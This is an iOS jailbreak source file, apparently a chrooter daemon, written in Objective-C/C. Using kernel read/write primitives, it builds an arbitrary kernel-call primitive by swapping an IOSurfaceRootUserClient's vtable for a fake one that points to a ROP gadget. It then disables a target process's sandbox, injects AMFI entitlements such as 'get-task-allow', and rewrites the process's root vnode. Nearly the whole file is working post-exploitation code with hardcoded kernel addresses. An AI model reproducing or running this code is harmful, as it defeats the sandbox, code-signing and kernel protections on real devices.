#include <stdio.h>
#import <Foundation/Foundation.h>

#include "config.h"
#include "kernel.h"
#include "vnode_utils.h"
#include "libkrw.h"

#include <dirent.h>
#include "changerootfs.h"
#include "libdimentio.h"
#include <IOKit/IOTypes.h>
#include "IOKitLib.h"
#include <pthread.h>

#include "kernel_call/kernel_call.h"

static uint64_t IOSurfaceRootUserClient_port = 0;
static uint64_t IOSurfaceRootUserClient_addr = 0;
static uint64_t fake_vtable = 0;
static int fake_kalloc_size = 0x1000;
static uint64_t fake_client = 0;
static pthread_mutex_t kexecute_lock;
static mach_port_t user_client;

mach_port_t prepare_user_client() {
    kern_return_t err;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    
    if (service == IO_OBJECT_NULL) {
        printf(" [-] unable to find service\n");
        exit(EXIT_FAILURE);
    }
    
    err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
    if (err != KERN_SUCCESS) {
        printf(" [-] unable to get user client connection\n");
        exit(EXIT_FAILURE);
    }
    
    
    printf("got user client: 0x%x\n", user_client);
    return user_client;
}

uint64_t task_self_addr() {
    
    uint64_t selfproc = proc_of_pid(getpid());
    if (selfproc == 0) {
        fprintf(stderr, "failed to find our task addr\n");
        exit(EXIT_FAILURE);
    }
    uint64_t addr = kernel_read64(selfproc + 0x10/*offsetof_task*/);
    
    uint64_t task_addr = addr;
    uint64_t itk_space = kernel_read64(task_addr + 0x330/*offsetof_itk_space*/);
    
    uint64_t is_table = kernel_read64(itk_space + 0x20/*offsetof_ipc_space_is_table*/);
    
    uint32_t port_index = mach_task_self() >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    uint64_t port_addr = kernel_read64(is_table + (port_index * sizeof_ipc_entry_t));
    
    return port_addr;
}

uint64_t find_port_address(mach_port_name_t port) {
   
    uint64_t task_port_addr = task_self_addr();

    uint64_t task_addr = kernel_read64(task_port_addr + 0x68/*offsetof_ip_kobject*/);
    uint64_t itk_space = kernel_read64(task_addr + 0x330/*offsetof_itk_space*/);
    
    uint64_t is_table = kernel_read64(itk_space + 0x20/*offsetof_ipc_space_is_table*/);
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;

    uint64_t port_addr = kernel_read64(is_table + (port_index * sizeof_ipc_entry_t));

    return port_addr;
}

void init_kexecute(uint64_t add_x0_x0_0x40_ret) {
    mach_port_t user_client = prepare_user_client();
    
    // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
    IOSurfaceRootUserClient_port =  find_port_address(user_client);//getAddressOfPort(getpid(), user_client); // UserClients are just mach_ports, so we find its address
    
    IOSurfaceRootUserClient_addr = kernel_read64(IOSurfaceRootUserClient_port + 0x68/*koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)*/); // The UserClient itself (the C++ object) is at the kobject field
    
    uint64_t IOSurfaceRootUserClient_vtab = kernel_read64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
    
    // The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
    // Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel
    
    // Create the vtable in the kernel memory, then copy the existing vtable into there
    fake_vtable = 0;//kmem_alloc(fake_kalloc_size);
    kmalloc(&fake_vtable, fake_kalloc_size);
    
    for (int i = 0; i < 0x200; i++) {
        kernel_write64(fake_vtable+i*8, kernel_read64(IOSurfaceRootUserClient_vtab+i*8));
    }
    
    // Create the fake user client
    fake_client = 0;//kmem_alloc(fake_kalloc_size);
    kmalloc(&fake_client, fake_kalloc_size);
    
    for (int i = 0; i < 0x200; i++) {
        kernel_write64(fake_client+i*8, kernel_read64(IOSurfaceRootUserClient_addr+i*8));
    }
    
    // Write our fake vtable into the fake user client
    kernel_write64(fake_client, fake_vtable);
    
    // Replace the user client with ours
    kernel_write64(IOSurfaceRootUserClient_port + 0x68/*koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)*/, fake_client);
    
    // Now the userclient port we have will look into our fake user client rather than the old one
    
    // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
    kernel_write64(fake_vtable+8*0xB7, add_x0_x0_0x40_ret);
    
    pthread_mutex_init(&kexecute_lock, NULL);
}

void term_kexecute(void) {
    kernel_write64(IOSurfaceRootUserClient_port + 0x68/*offsetof_ip_kobject*/, IOSurfaceRootUserClient_addr);
    kdealloc(fake_vtable, fake_kalloc_size);
    kdealloc(fake_client, fake_kalloc_size);
}

uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    pthread_mutex_lock(&kexecute_lock);

    // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
    // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
    // This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
    // function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
    // through like normal.

    // Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
    // We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
    // (i'm not actually sure if the switch back is necessary but meh)
//    for(int i = 0; i < 0x120; i+=0x4) {
//        printf("fake_client read: 0x%llx, i: %x\n", kernel_read64(fake_client + i), i);
//    }
    uint64_t offx20 = kernel_read64(fake_client+0x40);
    uint64_t offx28 = kernel_read64(fake_client+0x48);
    kernel_write64(fake_client+0x40, x0);
    kernel_write64(fake_client+0x48, addr);
    uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    kernel_write64(fake_client+0x40, offx20);
    kernel_write64(fake_client+0x48, offx28);

    pthread_mutex_unlock(&kexecute_lock);

    return returnval;
}

static uint32_t off_OSDictionary_GetObjectWithCharP = sizeof(void*) * 0x26;
static uint32_t off_OSDictionary_SetObjectWithCharP = sizeof(void*) * 0x1F;

int OSDictionary_SetItem(uint64_t dict, const char *key, uint64_t val) {
    size_t len = strlen(key) + 1;

    uint64_t ks = 0;
    kmalloc(&ks, len);
    kwrite_buf_univ(ks, key, len);

    uint64_t vtab = kernel_read64(dict);
    uint64_t f = kernel_read64(vtab + off_OSDictionary_SetObjectWithCharP);
    printf("f: 0x%llx, ks: 0x%llx\n", f, vtab);

    int rv = (int) kexecute(f, dict, ks, val, 0, 0, 0, 0);

    kdealloc(ks, len);

    return rv;
}

uint64_t OSDictionary_GetItem(uint64_t dict, const char *key) {
    size_t len = strlen(key) + 1;

    uint64_t ks = 0;
    kmalloc(&ks, len);
    kwrite_buf_univ(ks, key, len);

    uint64_t vtab = kernel_read64(dict);
    uint64_t f = kernel_read64(vtab + off_OSDictionary_GetObjectWithCharP);
    printf("f: 0x%llx, ks: 0x%llx\n", f, ks);

    int rv = (int) kexecute(f, dict, ks, 0, 0, 0, 0, 0);
    
    kdealloc(ks, len);

    return rv;
}

uint64_t OSUnserializeXML(const char* buffer) {
    size_t len = strlen(buffer) + 1;

    uint64_t ks = 0;
    kmalloc(&ks, len);
    kwrite_buf_univ(ks, buffer, len);

    uint64_t errorptr = 0;

    int result = 0;
    uint64_t argv[1] = {ks};
    kcall(0xFFFFFFF00765A3F4 + kslide/*find_osunserializexml()*/, 1/*size_t argc*/, argv, &result);
    //kexecute(0xFFFFFFF00765A3F4 + kslide/*find_osunserializexml()*/, ks, errorptr, 0, 0, 0, 0, 0);
    kdealloc(ks, len);

    return result;
}

uint64_t get_exception_osarray(void) {
    return OSUnserializeXML("<array>"
    "<string>IOSurfaceAcceleratorClient</string>"
    "<string>IOMobileFramebufferUserClient</string>"
    "<string>IOSurfaceRootUserClient</string>"
    "</array>");
}


//#if 0
extern CFNotificationCenterRef CFNotificationCenterGetDistributedCenter(void);

bool change_rootvnode(uint64_t vp, pid_t pid){
    
    if(!vp) return false;
    
    printf("getting proc_t\n");
    uint64_t proc = proc_of_pid(pid);

    if(!proc) return false;
    
    printf("escape sandbox\n");
    uint64_t creds = kernel_read64(proc + /*off_p_ucred*/0xf0);
    uint64_t cr_label = kernel_read64(creds + 0x78/*off_ucred_cr_label*/);
    kernel_write64(cr_label + 0x10/*off_sandbox_slot*/, 0);
    
    init_kexecute(0xFFFFFFF005D958D4 + kslide/*add_x0_x0_0x40_ret*/);
    unsigned off_amfi_slot = 0x8;
    uint64_t amfi_entitlements = kernel_read64(cr_label + off_amfi_slot);
    printf("amfi_entitlements: 0x%llx\n", kernel_read64(amfi_entitlements));
    
    int ret = OSDictionary_SetItem(amfi_entitlements, "get-task-allow", 0xFFFFFFF0076302E8 + kslide/*find_OSBoolean_True()*/);
    printf("OSDictionary_SetItem result: %d\n", ret);
    
    static const char *exc_key = "com.apple.security.iokit-user-client-class";
    printf("get_exception_osarray(): 0x%llx\n", get_exception_osarray());
    ret = OSDictionary_SetItem(amfi_entitlements, exc_key, get_exception_osarray());
    printf("OSDictionary_SetItem result2: %d\n", ret);
    
//    uint64_t present = OSDictionary_GetItem(amfi_entitlements, exc_key);
//    printf("present: 0x%llx\n", present);
    
    term_kexecute();
    
    printf("reading pfd\n");
    uint64_t filedesc = kernel_read64(proc + off_p_pfd);
    
    printf("writing fd_cdir\n");
    kernel_write64(filedesc + off_fd_cdir, vp);
    
    printf("writing fd_rdir\n");
    kernel_write64(filedesc + off_fd_rdir, vp);
    
    printf("setting up fd_flags\n");
    uint32_t fd_flags = kernel_read32(filedesc + 0x58);
    
    fd_flags |= 1; // FD_CHROOT = 1;
    
    kernel_write32(filedesc + 0x58, fd_flags);
    
    printf("finish\n");
    return true;
    
}

uint64_t rootvp;

void receive_notify_chrooter(CFNotificationCenterRef center,
                             void * observer,
                             CFStringRef name,
                             const void * object,
                             CFDictionaryRef userInfo){
    
    NSDictionary* info = (__bridge NSDictionary*)userInfo;
    
    NSLog(@"receive notify %@", info);
    
    pid_t pid = [info[@"Pid"] intValue];

    uint64_t rootvp = get_vnode_with_chdir(FAKEROOTDIR);
    set_vnode_usecount(rootvp, 0x2000, 0x2000);
    
    //change_rootvnode(FAKEROOTDIR, pid);
    change_rootvnode(rootvp, pid);
    
    //set_vnode_usecount(vnode_ref_by_chdir(FAKEROOTDIR), 0xf000);
    set_vnode_usecount(rootvp, 0x2000, 0x2000);
    
    usleep(100000);
    
    kill(pid, SIGCONT);
    
}



bool is_empty(const char* path){
    
    DIR* dir = opendir(path);
    struct dirent* ent;
    int count = 0;
    
    while ((ent = readdir(dir)) != NULL) {
        count++;
    }
    
    if(count == 2){
        return YES;
    }else{
        return NO;
    }
    
}


int main(int argc, char *argv[], char *envp[]) {
    int err = init_kernel();
    if (err) {
        return 1;
    }
    
    if(is_empty(FAKEROOTDIR) || access(FAKEROOTDIR"/private/var/containers", F_OK) != 0){
        printf("error fakeroot not mounted\n");
        return 1;
    }
    
    //uint64_t rootvp = getVnodeAtPath(FAKEROOTDIR);
    chdir("/");
    
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wimplicit-function-declaration"
        
        
    CFNotificationCenterAddObserver(CFNotificationCenterGetDistributedCenter(), NULL, receive_notify_chrooter, (__bridge CFStringRef)@"jp.akusio.chrooter", NULL, CFNotificationSuspensionBehaviorDeliverImmediately);
        
        	
#pragma clang diagnostic pop
        
    printf("start changerootfs\n");
        
    CFRunLoopRun();
    
    return 1;
    

}
//#endif
//int main() {}
